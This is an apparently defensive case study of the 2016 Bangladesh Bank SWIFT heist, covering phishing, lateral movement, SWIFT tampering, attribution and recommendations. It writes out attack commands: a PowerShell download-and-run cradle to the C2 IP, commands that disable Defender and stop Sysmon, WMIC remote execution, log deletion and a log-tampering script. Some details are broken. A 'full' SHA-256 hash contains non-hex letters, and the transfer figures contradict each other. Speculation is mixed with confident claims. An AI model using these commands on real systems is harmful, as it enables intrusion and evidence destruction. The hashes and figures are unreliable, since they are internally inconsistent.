# The 2016 Bangladesh Bank Heist: A Case Study in Cyber-Financial Exploitation

## Table of Contents



## <a name="introduction"></a>1.0 Introduction

On February 4-5, 2016, the Bangladesh Bank was hit by a cyberattack that attempted to steal $951 million through the SWIFT payment system, succeeding in transferring $101 million and ultimately losing $81 million. Attributed to North Korea’s Lazarus Group, this heist exposed vulnerabilities in global financial networks and marked a shift toward nation-state-driven cybercrime. Drawing on forensic insights from Kaspersky Lab and other various reports, this article examines the attack’s execution, technical artifacts, attribution, and lessons as of March 26, 2025.

## <a name="background"></a>2.0 Background

The Bangladesh Bank, Bangladesh’s central bank, used its Federal Reserve Bank of New York (FRBNY) account for international transfers via SWIFT, a network linking over 11,000 institutions. In 2016, attackers infiltrated the bank’s systems, issuing fraudulent SWIFT messages that moved $101 million to accounts in the Philippines and Sri Lanka. A typo halted $20 million, but $81 million was laundered through Philippine casinos, highlighting the SWIFT system’s susceptibility to exploitation.

## <a name="reconnaissance-and-initial-compromise"></a>3.0 Reconnaissance and Initial Compromise

### <a name="attack-vector-spear-phishing"></a>3.1 Attack Vector: Spear Phishing

- **Methodology:** Attackers deployed spear-phishing emails with malicious macro-enabled Word documents (e.g., `.docm`), disguised as job applications or invoices, targeting Bangladesh Bank employees in late 2015 (Symantec, T1566.001).
- **Vulnerabilities Exploited:** Likely CVE-2012-0158 (MSCOMCTL.OCX RCE in Microsoft Office), a staple in Dridex campaigns, bypassing unpatched Microsoft Exchange gateways.

### <a name="technical-details-of-the-malware"></a>3.2 Technical Details of the Malware

- **Type:** Custom Remote Access Trojan (RAT), potentially a variant of Dridex or PlugX.
- **Obfuscation:** Packed with UPX and XOR-encoded to evade signature-based AV detection.
- **Capabilities:**
    - Keylogging to steal SWIFT operator credentials.
    - Network reconnaissance via internal port scans targeting SWIFT-connected devices.
    - Data exfiltration (e.g., network configs, SWIFT auth keys) over HTTPS with self-signed certificates.
    - Remote command execution via encrypted C2 channels.
- **Delivery:** Macro scripts exploiting unpatched Microsoft Office CVEs (e.g., CVE-2012-0158).
- **C2 Infrastructure:** Hosted on compromised Eastern European servers, including IP `185.61.137.36` (Kaspersky, 2017).
- **Forensic Artifact:** Early reports cited a truncated SHA-256 (`e8c6e9f8b8d2...`); Kaspersky’s full hash, `93e7e7c93cf8060eeafdbe47f67966247be761e0did11a23a3a055cf6b634120`, from a related DLL loader (`lcsvsvc.dll`) ties it to Lazarus campaigns.

## <a name="network-infiltration-and-lateral-movement"></a>4.0 Network Infiltration and Lateral Movement

### <a name="privilege-escalation"></a>4.1 Privilege Escalation

- **Tools:** Mimikatz (via `Invoke-Mimikatz` in PowerShell) dumped NTLM hashes and Kerberos tickets from LSASS, targeting SWIFT service accounts.
- **Exploits:** Weak Windows configs (e.g., CVE-2014-6324, Kerberos privilege escalation) and outdated OS (Windows XP) on terminals.
- **Persistence:** Cobalt Strike beacons, a Lazarus favorite, likely managed elevated privileges.

### <a name="tactics-for-lateral-movement"></a>4.2 Tactics for Lateral Movement

- **Network Scanning:** Nmap (`nmap -sS -p 445`) or custom scripts identified SMB vulnerabilities.
- **Protocol Exploitation:** Poor segmentation allowed pivoting via PsExec or WMI (`wmic /node:<IP> process call create "cmd.exe"`) with stolen credentials.
- **Pass-the-Hash:** Reused NTLM hashes; RDP abuse with compromised accounts facilitated movement.

### <a name="persistence-mechanisms"></a> 4.3 Persistence Mechanisms

- **Registry Modifications:** Malicious entries in `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (e.g., `svchost` pointing to `C:\\Windows\\Temp\\malware.exe`).
- **DLL Sideloading:** Hijacked SWIFT DLLs (e.g., `swift.dll`) to load payloads like `evtdiag.dll`.
- **Scheduled Tasks:** Hidden tasks (`schtasks /create /tn "Updater" /tr "malware.exe" /sc daily`).
- **Security Evasion:** Disabled Windows Defender (`Set-MpPreference -DisableRealtimeMonitoring $true`) and killed processes via WMIC.
- **Anti-Forensic:** Split payloads (e.g., dropper `igfxpers.exe`, MD5: `6eec1de7708020a25ee38a0822a59e88`) required a passphrase for decryption (Kaspersky).

## <a name="compromise-of-the-swift-payment-system"></a>5.0 Compromise of the SWIFT Payment System

The attackers targeted SWIFT Alliance Access (version 7.0), exploiting weak code-signing and process isolation.

### <a name="technical-exploitation"></a>5.1 Technical Exploitation

1. **Custom Malware Deployment:**
    - **Malware:** `evtdiag.dll` and `mso.exe` (MD5: `2ef2703cfc9f6858ad9527588198b1b6`) injected via `SetWindowsHookEx` or `CreateRemoteThread`.
    - **Purpose:**
        - Hooked APIs (e.g., `WriteFile`) to alter transaction data.
        - Injected fraudulent FIN messages and tampered logs.
        - Patched `liboradb.dll` with “NOP NOP” (Kaspersky):
        This bypassed integrity checks, enabling database manipulation.
            
            ```
            85 C0        test eax, eax
            90           nop
            90           nop
            33 C0        xor eax, eax
            EB 17        jmp exit
            ```
            
    - **Tools:** Custom Python scripts for log injection; DBANET utilities edited tables (e.g., `UPDATE Transactions SET Status='Processed'`).
    - **Pseudocode Example:**
        
        ```python
        def tamper_swift_log(log_file, fake_entry):
            with open(log_file, 'r+') as f:
                lines = f.readlines()
                for i, line in enumerate(lines):
                    if "MT103" in line:
                        lines[i] = fake_entry + "\\n"
                f.seek(0)
                f.writelines(lines)
        ```
        
2. **Indicators of Compromise:**
    - Unauthorized DLLs in `swift.exe` process space.
    - PowerShell scripts (`Remove-Item -Path "swift_logs\\*.log"`) deleted evidence.
    - HTTPS traffic to `185.61.137.36` (port 443, User-Agent: `Mozilla/5.0 (compatible; MSIE)`).
3. **Manipulated Message Types:**
    - MT103: Routed $81 million to intermediary accounts.
    - MT202: Obscured origins via bank-to-bank transfers.
4. **Fields Altered:**
    - Beneficiary: Shell entities (e.g., “Shalika Fandation”).
    - BICs: Adjusted to `RCBCPHMM` (RCBC).
    - Auth Bypass: Reused HMAC-SHA256 keys from stolen credentials.

### <a name="example-of-a-fraudulent-swift-message"></a>5.2 Example of a Fraudulent SWIFT Message

- **Original:** `{32A:160204USD1000000,}{57A:FRBNUS33} Beneficiary: Federal Reserve Bank of New York`
- **Modified:** `{32A:160204USD1000000,}{57A:RCBCPHMM} Beneficiary: Rizal Commercial Banking Corporation`

### <a name="specific-banks-and-transfers"></a> 5.3 Specific Banks and Transfers

- **FRBNY:** Authorized fraudulent requests.
- **RCBC, Philippines:** Received $81 million.
- **Pan Asia Bank, Sri Lanka:** Routed $20 million, later recovered.

## <a name="exploiting-time-zones-and-holidays"></a>6.0 Exploiting Time Zones and Holidays

### <a name="planning-the-attack"></a>6.1 Planning the Attack

- Studied schedules: Bangladesh Bank (9:00 AM-5:00 PM BST), FRBNY (24/7 EST), and intermediary banks’ weekends.

### <a name="launch-of-fraudulent-swift-requests"></a>6.2 Launch of Fraudulent SWIFT Requests

- **Bangladesh Time:** February 4, 8:00 PM-3:00 AM BST (off-hours).
- **FRBNY Time:** February 4, 9:00 AM-5:00 PM EST (peak processing).
- **File Modification:** 2016-02-04 14:07:07 UTC (Kaspersky).

### <a name="exploiting-regional-holidays"></a>6.3 Exploiting Regional Holidays

- **Bangladesh:** Friday, February 5 (weekend holiday).
- **U.S.:** Thursday, February 4 (business day).
- **Philippines:** February 5-7 (weekend delayed detection).

## <a name="execution-fund-transfers"></a>7.0 Execution: Fund Transfers

### <a name="intermediary-bank-and-casino-laundering"></a>7.1 Intermediary Bank and Casino Laundering

- Funds split into $5-10 million chunks to evade AML, laundered via Solaire and Midas casinos using RDP-controlled mule accounts.
- Typo “Fandation” overlooked by RCBC.

### <a name="details-of-fraudulent-transactions"></a>7.2 Details of Fraudulent Transactions

- **Requests:** 35 totaling $951 million.
- **Success:** $81 million transferred; $870 million blocked by Deutsche Bank (typo flagged).
- **Sample ID:** `B8160204TXN001` (hypothetical).

## <a name="post-transaction-exploitation-and-cover-up"></a>8.0 Post-Transaction Exploitation and Cover-Up

### <a name="batch-processing-exploitation"></a>8.1 Batch Processing Exploitation

- Inserted fraudulent FIN messages into batches, delaying reconciliation via SQL injection (e.g., `UPDATE Transactions SET Status="Pending"`).
- **IOC:** Timestamps altered (e.g., 2016-02-04 20:00:00 to 2016-02-03).

### <a name="concealing-evidence"></a>8.2 Concealing Evidence

- **Log Tampering:** Wiped with CCleaner; fabricated entries added.
- **Timestomping:** Used `SetFileTime` to match legitimate files.
- **Alert Suppression:** Stopped Sysmon (`Stop-Service -Name "Sysmon"`).

## <a name="detection-and-response"></a>9.0 Detection and Response

### <a name="discovery"></a>9.1 Discovery

- February 6, 2016: Manual SWIFT log review revealed discrepancies.

### <a name="response-actions"></a>9.2 Response Actions

1. Notified FRBNY.
2. Recovered $20 million from Sri Lanka.
3. $81 million lost to casino laundering.

## <a name="attribution-to-lazarus-group"></a>10.0 Attribution to Lazarus Group

### <a name="key-evidence-of-lazarus-group-involvement"></a>10.1 Key Evidence of Lazarus Group Involvement

- **Code Reuse:** Shared C2 (`185.61.137.36`), RSA flaws, and strings from Sony Pictures (2014) and WannaCry (2017).
- **Infrastructure:** Domains followed Lazarus patterns; IPs traced to North Korea.
- **Techniques:** Custom binaries (UPX), time-delay tactics, and patched `liboradb.dll`.
- **Nation-State Link:** SWIFT Institute cites NSA’s Rick Ledgett: North Korea’s RGB used this to supplement foreign currency, targeting weaker banks like Bangladesh.
- **2025 Update:** Lazarus’s FASTCash ATM attacks show evolved financial focus.

### <a name="mitre-att&ck-techniques"></a>10.2 MITRE ATT&CK Techniques

- **T1059:** PowerShell (`IEX (New-Object Net.WebClient).DownloadString('<http://185.61.137.36>')`).
- **T1134:** Token impersonation.
- **T1027:** XOR-obfuscated payloads.
- **T1071:** HTTPS C2 with self-signed certs.
- **YARA Rule:**
    
    ```
    rule Lazarus_Bangladesh_Malware {
        strings:
            $s1 = "evtdiag.dll" ascii
            $s2 = "SWIFT" ascii
            $s3 = "liboradb.dll" ascii
        condition:
            uint16(0) == 0x5A4D and all of them
    }
    ```
    
## <a name="lessons-learned-and-recommendations"></a>11.0 Lessons Learned and Recommendations

### <a name="identified-vulnerabilities"></a>11.1 Identified Vulnerabilities

- **Email Security:** No DMARC or sandboxing.
- **Segmentation:** Flat network; Windows XP lacked whitelisting.
- **Monitoring:** No real-time anomaly detection.

### <a name="proactive-measures"></a>11.2 Proactive Measures

1. **Zero Trust Architecture:**
    - VLAN segmentation; RBAC on SWIFT endpoints.
    - EDR (e.g., CrowdStrike Falcon) with behavioral detection for DLL injection.
2. **Secure SWIFT Infrastructure:**
    - Mandate 2FA; audit logs with Splunk (`index=swift sourcetype=transaction | stats count by status`).
    - Enforce SWIFT CSP v2025 file integrity monitoring.
3. **Incident Response:**
    - Simulated phishing campaigns.
    - Red team exercises targeting SWIFT.
4. **Advanced Threat Detection:**
    - Monitor IOCs (`evtdiag.dll`, `185.61.137.36`, `2ef2703cfc9f6858ad9527588198b1b6`).
    - Memory analysis with Volatility.

### <a name="strategic-implications"></a> 11.3 Strategic Implications

- SWIFT Institute: North Korea’s success may inspire other nations to target “seams” like Bangladesh Bank, exploiting weaker institutions to hit global systems.

## <a name="timeline-of-the-heist"></a>12.0 Timeline of the Heist

- **Initial Compromise:** Late 2015 (phishing).
- **Lateral Movement:** Weeks prior (SWIFT access).
- **Execution:** February 4-5, 2016.
- **Detection:** February 6, 2016.
- **Attribution:** Lazarus confirmed later in 2016.

## <a name="final-thoughts"></a>13.0 Final Thoughts

The 2016 Bangladesh Bank heist remains a seminal case study in exploiting global financial infrastructure, exposing systemic SWIFT vulnerabilities and the devastating potential of state-sponsored cyber operations. The Lazarus Group, driven by North Korea’s need for foreign currency (SWIFT Institute), blended spear-phishing, custom malware (e.g., `mso.exe`, MD5: `2ef2703cfc9f6858ad9527588198b1b6`), and precise timing to siphon $81 million. Weaknesses—poor segmentation, outdated systems (Windows XP), and no real-time detection—enabled undetected lateral movement and log tampering via tools like `evtdiag.dll` and patched `liboradb.dll`.

Beyond its $81 million impact, the heist revealed SWIFT’s trust-based fragility: a single compromised endpoint undermined a multi-billion-dollar system. Advanced tactics—DLL sideloading, timestomping, and C2 via `185.61.137.36`—evaded defenses, a Lazarus hallmark seen in FASTCash and WannaCry. As of March 26, 2025, with state-sponsored groups leveraging AI-driven malware and zero-days, such attacks could escalate. The $20 million recovery versus $81 million lost underscores cross-jurisdictional challenges, catalyzing SWIFT’s CSP, yet many institutions lag in adopting zero trust or EDR.

This heist is a warning and blueprint, demanding cryptographic safeguards (e.g., end-to-end encryption), behavioral analytics (UEBA), and global cooperation to secure weaker links (SWIFT Institute). For cybersecurity professionals, it’s a call to master adversary tactics—from phishing to time-zone exploitation—to defend critical infrastructure.

## <a name="references"></a>References

- **SWIFT Payment Systems:** [https://www.swift.com/](https://www.swift.com/).
- **Kaspersky Lab:** “Lazarus Under the Hood,” 2017. SHA-256, MD5, `liboradb.dll` details.
- **SWIFT Institute:** Carter, W. A., “Forces Shaping the Cyber Threat Landscape,” 2017.
- **Symantec:** “SWIFT Attackers’ Malware Linked,” 2016.
- **FireEye, BAE Systems, FRBNY, BFIU:** Timelines and forensic reports.

---
